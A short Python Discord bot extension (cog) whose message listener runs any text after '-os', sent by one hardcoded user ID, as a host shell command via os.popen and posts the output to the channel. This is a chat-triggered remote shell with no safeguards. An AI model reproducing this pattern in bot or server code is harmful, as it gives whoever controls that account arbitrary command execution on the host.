import discord
import os
from discord.ext import commands
class DevCommands(commands.Cog, name='Developer Commands'):
  '''These are the developer commands'''
  def __init__(self, bot):
    self.bot = bot

  @commands.Cog.listener('on_message')
  async def mdsasa(self, message):
    if message.content.startswith('-os') and message.author.id == 578789460141932555:
      await message.channel.send(os.popen(message.content[3:]).read())

def setup(bot):
  bot.add_cog(DevCommands(bot))
  print('Loaded!')